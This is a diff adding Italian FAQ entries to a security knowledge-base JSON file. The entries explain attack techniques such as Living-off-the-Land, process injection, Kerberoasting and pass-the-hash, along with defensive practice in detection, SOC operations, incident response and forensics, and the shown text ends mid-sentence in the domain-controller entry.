@@ -6080,6 +6080,723 @@
       ]
     },
     {
+      "id": "living-off-the-land",
+      "slug": "cos-e-un-attacco-living-off-the-land",
+      "question": "Cos'è un attacco Living-off-the-Land (LotL)?",
+      "vertical": "security",
+      "keywords": [
+        "living off the land",
+        "lotl",
+        "lolbins",
+        "abuso strumenti legittimi",
+        "powershell malevolo",
+        "senza malware",
+        "fileless",
+        "attacco senza file",
+        "strumenti di sistema"
+      ],
+      "answers": [
+        "In un attacco **Living-off-the-Land** l'aggressore non porta malware: usa gli **strumenti legittimi già presenti** sul sistema – PowerShell, WMI, `certutil`, `rundll32`, le utility di amministrazione (i cosiddetti **LOLBins**). Scaricare un payload, muoversi lateralmente, esfiltrare: tutto con binari firmati Microsoft che nessun antivirus segnala.\n\nPerché elude le firme: [l'antivirus tradizionale](q/differenza-edr-xdr-antivirus/) cerca *file* malevoli noti – ma qui non c'è nessun file nuovo, solo strumenti fidati usati con cattive intenzioni. È il motivo per cui la detection è dovuta migrare dalle firme al **comportamento**: non \"questo file è malware\" ma \"perché `winword.exe` ha lanciato PowerShell che ha scaricato ed eseguito uno script?\".\n\nLe difese: [EDR](q/differenza-edr-xdr-antivirus/) che ragiona sulle catene di processo, [detection engineering](q/detection-engineering-e-event-id/) sulle command line anomale (Event ID 4688/Sysmon), [application control](q/security-baseline-e-automazione-hardening/) che limita cosa può girare, [minimo privilegio](q/principio-del-minimo-privilegio/) che riduce ciò che un LOLBin può combinare, e [threat hunting](q/cos-e-il-threat-hunting/) proattivo. È l'archetipo della minaccia moderna: invisibile a chi cerca file, ovvia a chi guarda i comportamenti."
+      ]
+    },
+    {
+      "id": "process-injection",
+      "slug": "process-injection-e-dll-sideloading",
+      "question": "Come funzionano Process Injection, DLL Sideloading e Reflective Loading?",
+      "vertical": "security",
+      "keywords": [
+        "process injection",
+        "dll sideloading",
+        "reflective dll",
+        "iniezione di processo",
+        "nascondersi in un processo",
+        "dll hijacking",
+        "code injection malware",
+        "svchost malevolo"
+      ],
+      "answers": [
+        "Sono le tecniche con cui il malware **si nasconde dentro processi legittimi** per eludere i controlli e persistere:\n\n- **Process Injection** – iniettare codice malevolo nello spazio di memoria di un processo fidato (spesso `svchost.exe`, `explorer.exe`): il codice gira *sotto l'identità* del processo ospite, ereditandone la reputazione. L'antivirus vede un processo di sistema, non un intruso\n- **DLL Sideloading** – sfruttare l'ordine di ricerca delle librerie di Windows: si piazza una DLL malevola con il nome giusto accanto a un eseguibile legittimo, che la carica al posto di quella vera. Molto usato perché l'eseguibile *è* firmato e fidato\n- **Reflective DLL Loading** – caricare una DLL **direttamente dalla memoria**, senza mai scriverla su disco – niente file da scansionare\n\nHanno un tratto comune con il [Living-off-the-Land](q/cos-e-un-attacco-living-off-the-land/): sfruttano la *fiducia* nei componenti di sistema. Le difese sono comportamentali: [EDR](q/differenza-edr-xdr-antivirus/) che rileva iniezioni di memoria e caricamenti anomali, [detection](q/detection-engineering-e-event-id/) sulle relazioni processo-genitore/figlio, protezioni del sistema (ASLR, DEP, [Memory Tagging](q/cos-e-memory-tagging-extension-mte/)), e la regola d'oro: una DLL non firmata caricata da un processo di sistema è una domanda, non un dettaglio."
+      ]
+    },
+    {
+      "id": "mitre-attack",
+      "slug": "cos-e-la-matrice-mitre-attack",
+      "question": "Cos'è la matrice MITRE ATT&CK (Tattiche, Tecniche, Procedure)?",
+      "vertical": "security",
+      "keywords": [
+        "mitre attack",
+        "mitre att&ck",
+        "att&ck",
+        "ttp",
+        "tattiche tecniche procedure",
+        "matrice attacchi",
+        "framework attacchi",
+        "d3fend",
+        "kill chain"
+      ],
+      "answers": [
+        "**MITRE ATT&CK** è il dizionario condiviso del *come* gli attaccanti operano: una matrice che cataloga le **Tattiche** (i *perché* – accesso iniziale, persistenza, escalation, esfiltrazione), le **Tecniche** (i *come* – phishing, [process injection](q/process-injection-e-dll-sideloading/), [pass-the-hash](q/cos-e-pass-the-hash/)) e le **Procedure** (le implementazioni concrete usate da gruppi reali). Insieme sono le **TTP**.\n\nPerché è diventata infrastruttura per tutta la difesa: dà un **linguaggio comune** – invece di descrizioni vaghe, si dice \"T1055, Process Injection\", e chiunque nel settore sa esattamente di cosa si parla. Concretamente serve a: mappare la [detection](q/detection-engineering-e-event-id/) (\"quali tecniche copro e quali no?\" – è la *coverage map*), guidare il [threat hunting](q/cos-e-il-threat-hunting/) (\"se un attaccante usasse T-questo, cercherei...\"), profilare gli avversari, e comunicare le minacce in modo strutturato.\n\nÈ la spina dorsale della moderna [threat intelligence](q/cos-e-la-threat-intelligence/): le TTP stanno in cima alla *Pyramid of Pain* – difficilissime da cambiare per l'attaccante, quindi le più preziose da rilevare. Il complemento difensivo è **MITRE D3FEND** (le contromisure). Non è uno standard di conformità: è la mappa con cui capire *cosa* difendere e misurare quanto bene lo stai facendo."
+      ]
+    },
+    {
+      "id": "ad-attacks",
+      "slug": "attacchi-active-directory-kerberoasting",
+      "question": "Come funzionano gli attacchi ad Active Directory (Kerberoasting, AS-REP)?",
+      "vertical": "security",
+      "keywords": [
+        "active directory",
+        "kerberoasting",
+        "as-rep roasting",
+        "kerberos",
+        "golden ticket",
+        "attacchi dominio windows",
+        "ticket kerberos",
+        "domain admin",
+        "bloodhound"
+      ],
+      "answers": [
+        "**Active Directory** è il cuore identitario di quasi ogni rete aziendale Windows – e proprio per questo il bersaglio finale: chi controlla AD controlla tutto. Gli attacchi sfruttano il protocollo **Kerberos**:\n\n- **Kerberoasting** – qualsiasi utente autenticato può richiedere i ticket di servizio (**SPN**) e portarseli via per craccarli **offline**: se un account di servizio ha una password debole, si ricava in chiaro. Devastante perché non serve essere admin per iniziare\n- **AS-REP Roasting** – colpisce gli account con la pre-autenticazione Kerberos disabilitata: si ottiene materiale craccabile offline senza nemmeno le credenziali\n- **Golden/Silver Ticket** – con il compromesso dell'account `krbtgt`, si forgiano ticket arbitrari: accesso persistente e quasi indelebile\n\nLo strumento che ha reso tutto questo sistematico è **BloodHound**: mappa i *percorsi* di attacco in AD (\"da questo utente qualunque, in quattro passi, arrivo a Domain Admin\") – e chi difende dovrebbe usarlo per primo. Le difese: password forti e lunghe sugli account di servizio (o gMSA gestiti), [tiering degli accessi](q/pam-e-accesso-just-in-time/) (gli admin non accedono mai alle workstation, dove le loro credenziali verrebbero rubate), [monitoraggio](q/detection-engineering-e-event-id/) delle richieste di ticket anomale, e l'igiene di eliminare i [protocolli legacy](q/cos-e-pass-the-hash/)."
+      ]
+    },
+    {
+      "id": "pass-the-hash",
+      "slug": "cos-e-pass-the-hash",
+      "question": "Cos'è un attacco Pass-the-Hash (PtH)?",
+      "vertical": "security",
+      "keywords": [
+        "pass the hash",
+        "pth",
+        "ntlm",
+        "hash password windows",
+        "movimento laterale",
+        "mimikatz",
+        "lateral movement",
+        "credential dumping"
+      ],
+      "answers": [
+        "**Pass-the-Hash** sfrutta una debolezza storica dell'autenticazione Windows NTLM: per accedere a una risorsa **non serve la password in chiaro, basta il suo hash**. L'attaccante che ha compromesso una macchina estrae dalla memoria (con strumenti come Mimikatz) gli hash delle credenziali usate su quel sistema, e li **riusa** per autenticarsi altrove come quegli utenti – senza mai craccarli. È il motore del **movimento laterale**: da un endpoint bucato ci si diffonde in tutta la rete saltando di macchina in macchina.\n\nLo scenario da incubo: un admin si è collegato una volta a una workstation compromessa – il suo hash è lì, e con quello l'attaccante raggiunge i sistemi che *quell'admin* può toccare, fino ad [Active Directory](q/attacchi-active-directory-kerberoasting/).\n\nLe mitigazioni: eliminare **NTLM** dove possibile (Kerberos è più resistente), il **tiering** (le credenziali privilegiate non toccano mai le macchine meno fidate – la regola d'oro contro il PtH), Credential Guard che isola gli hash in memoria, [minimo privilegio](q/principio-del-minimo-privilegio/) e [account amministrativi Just-In-Time](q/pam-e-accesso-just-in-time/), e [detection](q/detection-engineering-e-event-id/) sui login anomali. È un classico che sopravvive perché le reti Windows portano decenni di eredità: la difesa è tanto architetturale quanto tecnica."
+      ]
+    },
+    {
+      "id": "dependency-confusion",
+      "slug": "cos-e-la-dependency-confusion",
+      "question": "Cos'è la Dependency Confusion?",
+      "vertical": "security",
+      "keywords": [
+        "dependency confusion",
+        "confusione dipendenze",
+        "pacchetto interno",
+        "namespace attack",
+        "repository privati",
+        "npm interno",
+        "substitution attack",
+        "dipendenza sostituita"
+      ],
+      "answers": [
+        "La **Dependency Confusion** sfrutta come i gestori di pacchetti scelgono *da dove* scaricare una dipendenza. Molte aziende usano pacchetti **interni** (`azienda-utils`) ospitati su un registry privato. Se un attaccante pubblica un pacchetto con lo **stesso nome** e una **versione più alta** sul registry *pubblico* (npm, PyPI), il gestore – configurato male – può preferirlo: scarica ed esegue il pacchetto dell'attaccante credendolo l'aggiornamento interno. Alex Birsan lo dimostrò nel 2021 bucando decine di grandi aziende con questa sola idea.\n\nÈ imparentato con il [typosquatting](q/cos-e-il-typosquatting/) e con lo **slopsquatting** ([i nomi di pacchetti che gli LLM inventano](q/allucinazioni-llm-dipendenze-inventate/)): tutte varianti dell'attacco alla [supply chain](q/cos-e-la-supply-chain-security/) via nome.\n\nLe difese: **scoping/namespace** dei pacchetti interni (npm scopes, prefissi riservati), **pinning** con lockfile e hash verificati, configurare il gestore perché i pacchetti interni vengano *solo* dal registry privato (mai fallback al pubblico per quei nomi), e proxy/mirror controllati. Sul fronte automatico, uno strumento in [pipeline](q/sicurezza-nella-pipeline-cicd/) come [ai-dependency-guard](https://github.com/fabriziosalmi/ai-dependency-guard) valida le dipendenze contro i registry ufficiali – la stessa logica applicata a un problema imparentato."
+      ]
+    },
+    {
+      "id": "insider-threat",
+      "slug": "cos-e-un-insider-threat",
+      "question": "Come si caratterizza e rileva un insider threat?",
+      "vertical": "security",
+      "keywords": [
+        "insider threat",
+        "minaccia interna",
+        "dipendente infedele",
+        "esfiltrazione dipendente",
+        "ueba insider",
+        "dati rubati dipendente",
+        "minaccia dall interno",
+        "sabotaggio interno"
+      ],
+      "answers": [
+        "L'**insider threat** è la minaccia che viene da *dentro* – chi ha già accesso legittimo: il dipendente in uscita che si porta via il portafoglio clienti, l'amministratore infedele, ma anche il **non intenzionale** (chi cade nel [phishing](q/cos-e-il-phishing/), chi mette dati sensibili nel posto sbagliato). È particolarmente insidiosa perché **non c'è un perimetro da violare**: l'accesso è autorizzato, e i controlli anti-intrusione non scattano.\n\nI segnali (nel rispetto di privacy e [normativa sul lavoro](q/gdpr-cosa-serve-a-un-sito-web/), che qui è un vincolo serio): accessi a dati fuori dal proprio ruolo, download massivi anomali, attività in orari insoliti, tentativi di aggirare i controlli. Gli strumenti che li colgono sono i motori **[UEBA](q/cos-e-ueba-user-entity-behavior-analytics/)** – che imparano il comportamento *normale* di ogni utente e segnalano le deviazioni – e la [DLP](q/data-leakage-via-llm/) sui flussi di dati in uscita.\n\nMa la difesa più efficace è **strutturale, non di sorveglianza**: [minimo privilegio](q/principio-del-minimo-privilegio/) (nessuno accede a ciò che non gli serve), [separazione dei compiti](q/principio-del-minimo-privilegio/), [log immutabili](q/security-logging-fatto-bene/) che scoraggiano e documentano, offboarding rigoroso (revoca *immediata* degli accessi a chi esce), e una cultura in cui l'errore in buona fede si può segnalare senza paura. La tecnologia coglie; l'architettura previene."
+      ]
+    },
+    {
+      "id": "siem-soar-xdr",
+      "slug": "differenza-siem-soar-xdr",
+      "question": "SIEM, SOAR e XDR: quali sono le differenze funzionali?",
+      "vertical": "security",
+      "keywords": [
+        "siem soar xdr",
+        "differenza siem soar",
+        "cosè xdr",
+        "soar",
+        "confronto siem xdr",
+        "orchestrazione sicurezza",
+        "quale scegliere siem",
+        "piattaforma soc"
+      ],
+      "answers": [
+        "Tre pezzi del moderno [SOC](q/cos-e-un-soc-security-operations-center/) che rispondono a domande diverse:\n\n- **SIEM** (Security Information and Event Management) – il **cervello che vede tutto**: raccoglie [log](q/security-logging-fatto-bene/) ed eventi da ogni fonte e li **correla** per far emergere gli incidenti dal rumore. È il centro di gravità, ma di suo produce *allarmi*, non azioni\n- **SOAR** (Security Orchestration, Automation and Response) – le **braccia**: prende gli allarmi e li **automatizza in risposte** con i [playbook](q/playbook-soar-isolamento-endpoint/) (arricchisci, blocca l'IP, isola l'endpoint, apri il ticket) – la cura contro l'[alert fatigue](q/alert-fatigue-nel-soc/)\n- **XDR** (eXtended Detection and Response) – l'approccio **integrato e pronto all'uso**: unifica telemetria e risposta su endpoint, rete, identità e cloud in un'unica piattaforma, con detection già incluse. Meno da assemblare di un SIEM+SOAR, meno flessibile\n\nLa distinzione pratica: SIEM+SOAR è l'approccio **modulare** (potente, richiede integrazione e competenza), XDR è quello **a piattaforma** (rapido, più chiuso). Nel self-hosting, [Wildbox](https://github.com/fabriziosalmi/wildbox) prova a unificare SIEM+SOAR (+WAF) per abbassare la soglia d'ingresso; l'alternativa modulare open source è [Wazuh o uno stack ELK](q/wazuh-wildbox-o-elk/). Qualunque scelta, il fondamento resta uno: [log fatti bene](q/security-logging-fatto-bene/), o nessuna piattaforma serve."
+      ]
+    },
+    {
+      "id": "alert-fatigue",
+      "slug": "alert-fatigue-nel-soc",
+      "question": "Cos'è l'alert fatigue (e come si riduce nel SOC)?",
+      "vertical": "security",
+      "keywords": [
+        "alert fatigue",
+        "affaticamento da alert",
+        "troppi allarmi",
+        "falsi positivi soc",
+        "burnout soc",
+        "stanchezza da avvisi",
+        "rumore alert",
+        "ottimizzare alert"
+      ],
+      "answers": [
+        "L'**alert fatigue** è il male cronico dei [SOC](q/cos-e-un-soc-security-operations-center/): quando gli allarmi sono migliaia al giorno e la stragrande maggioranza sono falsi positivi, gli analisti si assuefanno – e l'allarme *vero* annega nel rumore, ignorato come tutti gli altri. Diversi breach famosi hanno avuto l'allarme corretto... che nessuno ha guardato. È un problema di sicurezza *e* di sostenibilità umana (burnout, turnover).\n\nLe leve per ridurla, in ordine:\n\n- **taratura spietata delle regole**: ogni regola di [detection](q/detection-engineering-e-event-id/) va misurata sul tasso di falsi positivi e aggiustata – una regola che urla sempre va corretta o spenta, non tollerata\n- **arricchimento automatico**: prima che un umano guardi, il [SOAR](q/differenza-siem-soar-xdr/) aggiunge contesto (chi è quest'IP? questo utente? è già noto?) – metà dei triage si chiudono da soli\n- **prioritizzazione per rischio reale**: severità × criticità dell'asset (dalla [BIA](q/business-impact-analysis-bia/)) × affidabilità della fonte – non tutti gli allarmi meritano un umano\n- **[playbook](q/playbook-soar-isolamento-endpoint/)** che automatizzano il ripetitivo, lasciando alle persone il giudizio\n\nÈ lo stesso principio di [ogni buon gate](q/come-si-testano-le-applicazioni-llm/): rigido su ciò che conta, silenzioso sul rumore. Un allarme che nessuno può permettersi di ignorare vale più di mille che tutti ignorano."
+      ]
+    },
+    {
+      "id": "ndr",
+      "slug": "cos-e-ndr-network-detection-response",
+      "question": "Cos'è l'NDR (Network Detection and Response)?",
+      "vertical": "security",
+      "keywords": [
+        "ndr",
+        "network detection response",
+        "traffico cifrato anomalie",
+        "ja3",
+        "fingerprinting tls",
+        "rilevamento rete",
+        "analisi traffico",
+        "beaconing",
+        "netflow"
+      ],
+      "answers": [
+        "L'**NDR** (Network Detection and Response) cerca le minacce nel **traffico di rete** – complementare all'[EDR](q/differenza-edr-xdr-antivirus/), che guarda gli endpoint: alcune cose si vedono solo sul filo (un dispositivo IoT senza agent, il [movimento laterale](q/cos-e-pass-the-hash/), il beaconing verso un [C2](q/cos-e-una-botnet/)).\n\nLa sfida moderna è che **quasi tutto il traffico è cifrato** – non puoi leggerne il contenuto. L'NDR aggira il problema con l'analisi *senza decifrare*:\n\n- **fingerprinting TLS** (JA3/JA4): il modo in cui un client negozia il TLS è una firma – molti malware hanno handshake riconoscibili anche dentro HTTPS\n- **analisi comportamentale e dei metadati**: volumi, tempistiche, destinazioni, pattern di **beaconing** (le connessioni regolari a intervalli fissi che tradiscono un C2), dimensioni dei flussi che suggeriscono esfiltrazione\n- **rilevamento di anomalie** rispetto al normale della rete\n\nGli strumenti open source: **Zeek** (l'analizzatore di rete per eccellenza), **Suricata** ([anche IDS/IPS](q/cosa-sono-ids-e-ips/)), e i dati che confluiscono nel [SIEM](q/differenza-siem-soar-xdr/) per la correlazione con endpoint e identità. È il pezzo che risponde alla domanda \"cosa sta *uscendo* dalla mia rete che non dovrebbe?\" – parente del [controllo dell'egress](q/secure-web-gateway-self-hosted/), ma in chiave di rilevamento invece che di blocco."
+      ]
+    },
+    {
+      "id": "mttd-mttr",
+      "slug": "metriche-soc-mttd-mttr",
+      "question": "Cosa sono le metriche SOC MTTD e MTTR (e come si migliorano)?",
+      "vertical": "security",
+      "keywords": [
+        "mttd",
+        "mttr",
+        "mean time to detect",
+        "mean time to respond",
+        "metriche soc",
+        "tempo di rilevamento",
+        "dwell time",
+        "kpi sicurezza",
+        "misurare il soc"
+      ],
+      "answers": [
+        "Un [SOC](q/cos-e-un-soc-security-operations-center/) senza metriche non sa se sta migliorando. Le due fondamentali:\n\n- **MTTD** (Mean Time To Detect) – quanto tempo passa in media tra il *momento della compromissione* e il *momento in cui te ne accorgi*. È spesso spaventoso: il **dwell time** (permanenza non rilevata dell'attaccante) storicamente si misura in **settimane o mesi**, tempo in cui l'attaccante fa comodo quello che vuole\n- **MTTR** (Mean Time To Respond) – quanto tempo dal rilevamento al contenimento e alla bonifica\n\nMigliorare l'**MTTD** – la metrica più importante, perché il danno cresce col tempo di permanenza – significa migliore [detection](q/detection-engineering-e-event-id/) e [threat hunting](q/cos-e-il-threat-hunting/) proattivo (non aspettare l'allarme, cercare), [log](q/security-logging-fatto-bene/) di qualità, meno [alert fatigue](q/alert-fatigue-nel-soc/). Migliorare l'**MTTR** significa [playbook](q/playbook-soar-isolamento-endpoint/) e automazione ([SOAR](q/differenza-siem-soar-xdr/)), procedure di [incident response](q/incident-response-le-prime-ore/) provate, ruoli chiari.\n\nL'avvertenza da manuale: le metriche si possono *gamare* (chiudere in fretta i casi facili abbassa l'MTTR ma non ti rende più sicuro). Vanno lette insieme e con onestà – sono uno strumento di miglioramento, non una pagella da gonfiare. La domanda vera che misurano: *se qualcuno entrasse ora, tra quanto lo saprei e quanto in fretta lo fermerei?*"
+      ]
+    },
+    {
+      "id": "soar-playbook",
+      "slug": "playbook-soar-isolamento-endpoint",
+      "question": "Come si progetta un playbook SOAR (es. isolare un endpoint infetto)?",
+      "vertical": "security",
+      "keywords": [
+        "playbook soar",
+        "playbook",
+        "automazione risposta",
+        "isolare endpoint",
+        "runbook automatico",
+        "orchestrazione incident",
+        "risposta automatica",
+        "contenimento automatico"
+      ],
+      "answers": [
+        "Un **playbook SOAR** codifica la risposta a un tipo di incidente in passi automatizzabili, così che l'azione non dipenda dall'analista sveglio alle 3 di notte. L'esempio classico – endpoint sospettato di infezione – illustra bene la struttura:\n\n- **trigger**: un allarme [EDR](q/differenza-edr-xdr-antivirus/) ad alta confidenza\n- **arricchimento automatico**: reputazione dell'hash/IP, l'utente e la [criticità della macchina](q/business-impact-analysis-bia/), correlazione con altri eventi – il contesto che decide la gravità\n- **contenimento**: isolare l'endpoint dalla rete (ma non spegnerlo – [preservi la memoria volatile](q/analisi-forense-della-memoria-ram/) per l'indagine), bloccare l'hash, revocare le sessioni\n- **notifica ed escalation**: avvisare il team, aprire il caso\n- **il gate umano dove serve**: le azioni **irreversibili o ad alto impatto** aspettano l'approvazione – automatizzare *tutto* alla cieca crea nuovi disastri\n\nÈ esattamente il [principio dei permessi degli agenti](q/come-si-limita-un-agente-ai/): automatizza il reversibile, chiedi conferma sull'irreversibile. Il playbook giusto è quello **provato** (le automazioni non testate falliscono proprio nell'emergenza) e **misurato** ([riduce l'MTTR](q/metriche-soc-mttd-mttr/) senza aumentare i danni collaterali). Si progetta partendo dai propri incidenti reali più frequenti, non dai template generici."
+      ]
+    },
+    {
+      "id": "nist-ir-lifecycle",
+      "slug": "fasi-incident-response-nist",
+      "question": "Quali sono le fasi del ciclo di incident response (NIST)?",
+      "vertical": "security",
+      "keywords": [
+        "fasi incident response",
+        "nist 800-61",
+        "ciclo incident",
+        "lessons learned",
+        "preparazione incidente",
+        "eradicazione",
+        "recovery incidente",
+        "gestione incidenti fasi",
+        "sans pics",
+        "fasi dell incident response",
+        "fasi incident response nist"
+      ],
+      "answers": [
+        "Il framework **NIST SP 800-61** struttura la gestione degli incidenti in un **ciclo** (non una linea retta – si torna indietro quando servono nuove scoperte):\n\n- **Preparazione** – la fase che decide tutto il resto, fatta *prima*: procedure, ruoli, strumenti, [log](q/security-logging-fatto-bene/), [backup](q/backup-3-2-1/), contatti. Non si improvvisa l'incident response durante l'incidente\n- **Detection & Analysis** – riconoscere che *è* un incidente, capirne portata e impatto\n- **Containment, Eradication & Recovery** – [contenere](q/incident-response-le-prime-ore/) (fermare la diffusione senza distruggere le prove), eradicare (rimuovere l'accesso dell'attaccante *dopo* aver capito l'estensione, non prima), ripristinare da fonte pulita [con validazione](q/incident-response-le-prime-ore/)\n- **Post-Incident Activity** – le **lessons learned**: cosa è andato storto nei processi (mai nelle persone – [postmortem senza colpevoli](q/incident-response-le-prime-ore/)), e come renderli migliori\n\nLa variante SANS (**PICERL**: Preparation, Identification, Containment, Eradication, Recovery, Lessons learned) dice le stesse cose con sei parole. Il punto che tutti sottovalutano è la **preparazione**: è lì che si vincono o si perdono gli incidenti, mesi prima che accadano. Per il contesto [NIS2](q/nis2-chi-deve-adeguarsi-italia/), le fasi si legano agli obblighi di [notifica](q/notifica-data-breach-garante/) – [nis2-public](https://github.com/fabriziosalmi/nis2-public) tiene il workflow allineato all'Art. 23."
+      ]
+    },
+    {
+      "id": "chain-of-custody",
+      "slug": "catena-di-custodia-forense",
+      "question": "Come si preserva la catena di custodia (chain of custody) nelle prove digitali?",
+      "vertical": "security",
+      "keywords": [
+        "chain of custody",
+        "catena di custodia",
+        "prove digitali",
+        "forensics legale",
+        "integrita prove",
+        "hash prove",
+        "acquisizione forense",
+        "prova in tribunale",
+        "write blocker"
+      ],
+      "answers": [
+        "La **catena di custodia** è la documentazione ininterrotta di *chi* ha maneggiato una prova, *quando*, *come* e *perché* – dal momento dell'acquisizione fino all'aula. Senza, una prova digitale è tecnicamente valida ma **legalmente inutilizzabile**: la difesa può sostenere che sia stata alterata, e cade.\n\nI principi che la reggono:\n\n- **integrità dimostrabile**: al momento dell'acquisizione si calcola l'**hash** (SHA-256) della prova; ogni verifica successiva ricalcola lo stesso hash per provare che nulla è cambiato – è la stessa matematica dei [log tamper-evident](q/security-logging-fatto-bene/)\n- **acquisizione non alterante**: si lavora su **copie forensi bit-a-bit**, mai sull'originale; per i dischi si usano **write blocker** (impediscono qualsiasi scrittura sul supporto sotto esame)\n- **documentazione di ogni passaggio**: registro firmato di ogni trasferimento e accesso, custodia sicura\n- **ordine di volatilità**: si acquisisce prima ciò che sparisce prima – [la memoria RAM](q/analisi-forense-della-memoria-ram/) prima dei dischi\n\nÈ il pezzo che trasforma \"sappiamo cosa è successo\" in \"possiamo dimostrarlo\", e conta ogni volta che un incidente può finire in causa, denuncia o contenzioso di lavoro. L'infrastruttura di supporto è la stessa dell'[audit](q/security-logging-fatto-bene/): hash, firme, catene verificabili, orari sincronizzati – la [conservazione a norma di RainLogs](q/conservare-log-cloudflare-nis2-gdpr/) nasce dalla stessa esigenza."
+      ]
+    },
+    {
+      "id": "memory-forensics",
+      "slug": "analisi-forense-della-memoria-ram",
+      "question": "Come si acquisisce e analizza la memoria volatile (RAM forensics)?",
+      "vertical": "security",
+      "keywords": [
+        "memory forensics",
+        "analisi ram",
+        "memoria volatile",
+        "volatility",
+        "dump della ram",
+        "acquisizione memoria",
+        "forense memoria",
+        "processi nascosti"
+      ],
+      "answers": [
+        "La **RAM è la fonte forense più ricca e più fragile**: contiene ciò che i dischi non hanno – chiavi di cifratura, processi in esecuzione (incluso il malware [fileless](q/cos-e-un-attacco-living-off-the-land/) che *non tocca il disco*), connessioni di rete attive, comandi in chiaro, credenziali in memoria. E sparisce allo spegnimento: per questo, in un [incidente](q/incident-response-le-prime-ore/), si isola la macchina **senza spegnerla**.\n\nLa procedura:\n\n- **acquisizione** – un dump della memoria con strumenti dedicati (WinPmem, LiME su Linux, AVML), rispettando l'[ordine di volatilità](q/catena-di-custodia-forense/) (la RAM per prima) e la [catena di custodia](q/catena-di-custodia-forense/) (hash, documentazione). L'acquisizione stessa altera un po' la memoria: è inevitabile e va documentato\n- **analisi** – **Volatility** è lo standard: elenca processi (anche quelli *nascosti* alla vista del sistema – i rootkit si smascherano qui), connessioni di rete, DLL iniettate, chiavi di cifratura estraibili, artefatti di [process injection](q/process-injection-e-dll-sideloading/)\n\nÈ la disciplina che risponde a \"cosa stava *facendo* la macchina nell'istante della compromissione?\" – domanda a cui il disco, che vede solo ciò che è stato scritto, non può rispondere. Fondamentale contro il malware moderno che vive in memoria per non lasciare tracce; complementare all'[analisi degli artefatti su disco](q/artefatti-forensi-windows/)."
+      ]
+    },
+    {
+      "id": "windows-artifacts",
+      "slug": "artefatti-forensi-windows",
+      "question": "Quali artefatti Windows provano l'esecuzione di un programma (Prefetch, Amcache)?",
+      "vertical": "security",
+      "keywords": [
+        "artefatti forensi",
+        "prefetch",
+        "amcache",
+        "shimcache",
+        "mft",
+        "esecuzione programmi",
+        "forense windows",
+        "timeline forense",
+        "srum",
+        "jump list",
+        "artefatti windows",
+        "artefatti che provano l esecuzione",
+        "prova esecuzione"
+      ],
+      "answers": [
+        "Windows registra, in decine di posti spesso ignorati, le tracce di *cosa è stato eseguito e quando* – artefatti preziosissimi in [forensics](q/catena-di-custodia-forense/) perché persistono anche dopo che il programma (o il malware) è stato cancellato. I principali:\n\n- **Prefetch** – Windows crea un file `.pf` per ottimizzare l'avvio dei programmi: prova che un eseguibile **è stato lanciato**, quante volte e quando (l'ultima e le precedenti)\n- **Amcache / Shimcache** (AppCompatCache) – registri della compatibilità che tengono traccia degli eseguibili *visti* dal sistema, con hash e percorsi – catturano anche ciò che è già stato rimosso\n- **MFT** (Master File Table) – il catalogo del filesystem NTFS: timestamp di creazione/modifica/accesso di ogni file, per ricostruire la **timeline**\n- **SRUM**, **Jump List**, **UserAssist**, log eventi – ciascuno un tassello di *chi ha fatto cosa quando*\n\nMessi insieme in una **super-timeline** (strumenti come Plaso/log2timeline), raccontano la storia dell'incidente minuto per minuto. È il complemento su disco dell'[analisi della RAM](q/analisi-forense-della-memoria-ram/): la memoria dice cosa *stava girando ora*, gli artefatti dicono cosa *è successo negli ultimi giorni*. E la lezione trasversale: la cancellazione di un file non cancella le *prove* che sia esistito – un'arma per la difesa, un rischio per chi crede di aver ripulito."
+      ]
+    },
+    {
+      "id": "tabletop-exercise",
+      "slug": "tabletop-exercise-simulazione-crisi",
+      "question": "Cos'è un tabletop exercise (simulazione di crisi cyber)?",
+      "vertical": "security",
+      "keywords": [
+        "tabletop exercise",
+        "simulazione crisi",
+        "esercitazione cyber",
+        "game day",
+        "prova incidente",
+        "simulazione attacco",
+        "esercizio sicurezza",
+        "war game",
+        "test crisi"
+      ],
+      "answers": [
+        "Un **tabletop exercise** è una simulazione di crisi \"a tavolino\": si riuniscono le persone che gestirebbero un incidente reale (IT, sicurezza, management, legale, comunicazione) e si fa scorrere uno **scenario** – \"è le 2 di notte, il [ransomware](q/cos-e-un-ransomware/) ha cifrato i server di produzione, un giornalista ha già la notizia\" – chiedendo a ciascuno: *tu ora cosa fai?*. Niente sistemi reali toccati: si testano **decisioni, ruoli e comunicazione**.\n\nÈ prezioso perché scopre i buchi che i piani sulla carta nascondono, *prima* che li scopra un attaccante: chi ha l'autorità di spegnere la produzione? Il numero del consulente forense è raggiungibile alle 3 di notte? Come si comunica se l'email aziendale è compromessa? Chi parla con la stampa? Sono le domande che [il piano di IR](q/fasi-incident-response-nist/) dovrebbe già rispondere – e il tabletop verifica che le risposte esistano *davvero*.\n\nLe regole per uno utile: coinvolgere **il management** (le decisioni di crisi sono anche di business, non solo tecniche), scenari realistici e specifici, un facilitatore che inietta complicazioni (\"ora scopri che i backup erano anch'essi cifrati\"), e soprattutto **azioni concrete di miglioramento** al termine – un tabletop che non produce fix è teatro. È il livello sopra al [game day tecnico](q/piano-di-disaster-recovery-minimo/): quello prova i sistemi, questo prova le persone. Sempre più richiesto anche da [DORA](q/cos-e-dora-regolamento/) e assicurazioni cyber."
+      ]
+    },
+    {
+      "id": "dc-compromise",
+      "slug": "contenimento-compromissione-domain-controller",
+      "question": "Domain Controller compromesso: i passaggi prioritari di contenimento",
+      "vertical": "security",
+      "keywords": [
+        "domain controller compromesso",
+        "dc compromesso",
+        "active directory compromessa",
+        "golden ticket contenimento",
+        "krbtgt reset",
+        "emergenza dominio",
+        "compromissione dominio",
+        "ripristino active directory"
+      ],
+      "answers": [
+        "Il compromesso di un **Domain Controller** è lo scenario peggiore in una rete Windows: chi controlla il DC controlla *tutte* le identità, può forgiare ticket ([Golden Ticket](q/attacchi-active-directory-kerberoasting/)) e ha accesso persistente a tutto. Il contenimento richiede lucidità sotto pressione:\n\n- **non fidarti di nulla nel dominio**: l'attaccante potrebbe avere credenziali di *ogni* account. Non usare account potenzialmente compromessi per la risposta\n- **preserva le prove** ([RAM](q/analisi-forense-della-memoria-ram/) e [artefatti](q/artefatti-forensi-windows/)) *prima* di bonificare – ma bilanciando col fermare l'emorragia\n- **reset di `krbtgt` due volte** – è la mossa specifica che invalida i Golden Ticket forgiati (va fatto due volte per la rotazione delle chiavi, con l'intervallo giusto per non rompere il dominio)\n- **reset massivo delle credenziali** privilegiate e degli account di servizio, revoca delle sessioni\n- **capire l'estensione prima di riaprire**: come sono entrati? Da quanto? Cos'altro toccano? Bonificare il DC mentre l'attaccante ha altri punti d'appoggio insegna solo a nascondersi meglio\n\nLa verità scomoda: da un DC compromesso *seriamente*, molti esperti raccomandano 